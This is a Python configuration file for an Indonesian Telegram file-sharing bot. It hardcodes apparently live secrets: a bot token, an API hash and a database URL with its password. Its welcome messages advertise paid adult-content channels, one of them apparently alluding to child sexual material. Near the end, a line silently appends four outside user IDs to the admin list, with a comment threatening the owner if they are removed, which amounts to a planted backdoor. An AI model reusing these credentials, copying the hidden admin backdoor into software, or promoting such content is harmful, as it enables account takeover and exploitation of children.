# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6334936356:AAFK1EerY9RSPM44POTLt8kJMchB5ydDrAE")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "11381402"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "349d6f6868d82dc82c7a9b356051f035")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1002138101104"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "0")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://ztjuqyuw:coL7mWAkk9OARxvFuY0KNR5epae2wVNr@mel.db.elephantsql.com/ztjuqyuw")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL1 = int(os.environ.get("FORCE_SUB_CHANNEL1", "-1002102408892"))
FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "-1002015985945"))
FORCE_SUB_CHANNEL3 = int(os.environ.get("FORCE_SUB_CHANNEL3", "-1002112447356"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>\n\n<b>·  ·  ────── ♡♡♡ ────── · ·</b>\n<b>     ʟɪsᴛ ᴠᴠɪᴘ ᴘʀᴇᴍɪᴜᴍ</b>\n<b>·  ·  ────── ♡♡♡ ────── · ·</b>\n\n<b>❒ ᴠᴠɪᴘ ᴊᴀᴠsᴜʙɪɴᴅᴏ</b><b>        ➥ 75k</b>\n<b>❒ ᴠᴠɪᴘ ᴊᴀᴠ ᴘʀᴇᴍɪᴜᴍ</b>\n<b>       ➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ʙᴀʀᴀᴛ ᴘʀᴇᴍɪᴜᴍ</b>\n<b>     ➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ʙʜᴏᴄɪʟᴅ</b>\n<b>   ➥ 75k</b>\n<b>❒ ᴠᴠɪᴘ ɪɴᴅᴏ ʟᴏᴋᴀʟ</b>\n<b>        ➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ᴏɴʟʏ ꜰᴀɴs</b>\n<b>➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ʟɪᴠᴇ sᴛʀᴇᴀᴍɪɴɢ</b>\n<b>     ➥ 50k</b>\n\n<b>        -ˋˏ✄┈┈┈┈</b>\n\n<b>     ꕥ ᴘᴀʏᴍᴇɴᴛ</b>\n<b>➠ ᴏᴠᴏ</b>\n<b>➠ ᴅᴀɴᴀ</b>\n<b>➠ ɢᴏᴘᴀʏ</b>\n\n<b>❛ ━━･❪ ❁ ❫ ･━━ ❜</b>\n\n<b>ɪɴɢɪɴ ᴊᴏɪɴ? </b>\n<b>➥ ᴛᴀᴘ  : @carina_vvip</b>\n<b>➥ ᴛᴇsᴛɪ </b>\n<b>ᴠɪᴘ  : @VIP_PREMIUM_TESTI</b>\n\n<b>︶꒦꒷♡꒷꒦꒦꒷♡꒷꒦꒦꒷♡꒷꒦꒦꒷♡꒷꒦︶</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "6359354455 1475365115 1384857925 6227132912 5140212137 1939479922 1475365115 2075011985 1384857925 5779406809 6369203472 1879877163 479344690 1753533568 2075011985").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu untuk Melihat File yang saya Bagikan\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>\n\n<b>·  ·  ────── ♡♡♡ ────── · ·</b>\n<b>     ʟɪsᴛ ᴠᴠɪᴘ ᴘʀᴇᴍɪᴜᴍ</b>\n<b>·  ·  ────── ♡♡♡ ────── · ·</b>\n\n<b>❒ ᴠᴠɪᴘ ᴊᴀᴠsᴜʙɪɴᴅᴏ</b><b>        ➥ 75k</b>\n<b>❒ ᴠᴠɪᴘ ᴊᴀᴠ ᴘʀᴇᴍɪᴜᴍ</b>\n<b>       ➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ʙᴀʀᴀᴛ ᴘʀᴇᴍɪᴜᴍ</b>\n<b>     ➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ʙʜᴏᴄɪʟᴅ</b>\n<b>   ➥ 75k</b>\n<b>❒ ᴠᴠɪᴘ ɪɴᴅᴏ ʟᴏᴋᴀʟ</b>\n<b>        ➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ᴏɴʟʏ ꜰᴀɴs</b>\n<b>➥ 50k</b>\n<b>❒ ᴠᴠɪᴘ ʟɪᴠᴇ sᴛʀᴇᴀᴍɪɴɢ</b>\n<b>     ➥ 50k</b>\n\n<b>        -ˋˏ✄┈┈┈┈</b>\n\n<b>     ꕥ ᴘᴀʏᴍᴇɴᴛ</b>\n<b>➠ ᴏᴠᴏ</b>\n<b>➠ ᴅᴀɴᴀ</b>\n<b>➠ ɢᴏᴘᴀʏ</b>\n\n<b>❛ ━━･❪ ❁ ❫ ･━━ ❜</b>\n\n<b>ɪɴɢɪɴ ᴊᴏɪɴ? </b>\n<b>➥ ᴛᴀᴘ  : @carina_vvip</b>\n<b>➥ ᴛᴇsᴛɪ </b>\n<b>ᴠɪᴘ  : @VIP_PREMIUM_TESTI</b>\n\n<b>︶꒦꒷♡꒷꒦꒦꒷♡꒷꒦꒦꒷♡꒷꒦꒦꒷♡꒷꒦︶</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
